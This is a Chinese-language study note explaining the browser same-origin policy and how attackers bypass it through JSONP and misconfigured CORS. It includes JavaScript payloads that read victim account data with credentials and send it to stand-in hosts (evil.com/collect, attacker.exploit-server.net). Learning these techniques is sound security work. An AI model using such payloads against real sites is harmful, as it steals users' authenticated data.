# 一、自我理解

### 1. SOP的作用

```js
<!-- 页面部署在 https://evil.com -->
<!DOCTYPE html>
<html>
<body>
  <script>
    // 攻击者试图通过 JS 发请求，读取 bank.com 的用户数据
    fetch("https://bank.com/account/info", {
      credentials: "include" // 自动携带受害者登录的 Cookie
    })
      .then(res => res.text())
      .then(data => {
        // 拿到银行页面的响应数据
        fetch("https://evil.com/collect?leak=" + encodeURIComponent(data));
      });
  </script>
</body>
</html>
```

当受害者访问 `evil.com` 页面时，浏览器执行如下逻辑：

1. `fetch("https://bank.com/account/info")` 会发起跨站请求；
2. 浏览器**确实会发送请求**，并自动带上 `bank.com` 的 Cookie（如果 `credentials: "include"`）；
3. 但是浏览器发现这个请求是**跨源的**（`evil.com` → `bank.com`），**并且响应没有 CORS 允许**；
4. 所以，虽然响应回来了，浏览器会在 **JavaScript 层面“阻止访问响应内容”**；
5. 攻击者的 `res.text()` 永远无法读取数据，`data` 是空的，**窃取失败**！

#### 总结：

	1. 防读不防发
	1. 作用对象：不同主机名/不同端口/不同协议

### 2. 绕过SOP------JSONP

SOP只对fetch、xmlhttprequest等请求起作用，对于纯script不起作用

```js
<script src="https://victim.com/api/userinfo?callback=evilCallback"></script>
<script>
  function evilCallback(data) {
    sendToAttacker(data);
  }
</script>
```

前提：

​	但**它不能读响应内容**，除非返回的是 JS 格式的可执行代码（如 JSONP）、application/javascript

```js
evilCallback({"username": "admin"});
```

### 3. 绕过SOP--------CORS

CORS是SOP的放行机制：如果放行过宽（配置错误），则可利用饶过SOP

#### 一、工作原理

##### 简单请求：

1. GET、HEAD、POST请求
2. application/x-www-form-urlencoded`、`multipart/form-data`、`text/plain
3. 没有自定义请求头

如果响应没有：

```
GET /api/info HTTP/1.1
Origin: https://evil.com

HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
```

那么浏览器就不会读取，响应内容（对CSRF无影响）

##### 复杂请求：

1. 简单请求相反

Preflight机制：Options请求

如果响应没有：

```
OPTIONS /api/transfer HTTP/1.1
Origin: https://evil.com
Access-Control-Request-Method: POST
Access-Control-Request-Headers: X-Custom-Header, Content-Type


HTTP/1.1 200 OK
Access-Control-Allow-Origin: https://evil.com
Access-Control-Allow-Methods: POST
Access-Control-Allow-Headers: X-Custom-Header, Content-Type
```

则浏览器直接报错，**不发送真实请求**

注意：

​	**当有 `Access-Control-Allow-Credentials: true` 时，Access-Control-Allow-Origin不能是 `\*`，否则浏览器会拦截响应。**

#### 二、可能的配置错误

##### 1. 信任Origin：null

注意：

​	需要使用iframe，sand-box，才能发送null源

##### 2. 回显源

发送什么源，返回什么源

```
Origin: https://evil.com

Access-Control-Allow-Origin: https://evil.com
```

##### 3. 利用XSS在信任的Origin上发送

假设：

- 目标主站是：`https://victim.com`
- 它的某个接口：`https://victim.com/accountDetails` 会返回敏感信息，并设置了 CORS：

```
http复制编辑Access-Control-Allow-Origin: https://trusted-but-xss.com
Access-Control-Allow-Credentials: true
```

- 而 `https://trusted-but-xss.com` 是目标的某个子域或合作方，被目标服务器错误信任，但**这个站点上你找到了 XSS**。

```js
<script>
  var req = new XMLHttpRequest();
  req.onload = function () {
    // 将获取到的数据 exfiltrate 到攻击者的收集服务器
    fetch("https://attacker.exploit-server.net/log?data=" + encodeURIComponent(this.responseText));
  };
  req.open("GET", "https://victim.com/accountDetails", true);
  req.withCredentials = true;
  req.send();
</script>
```

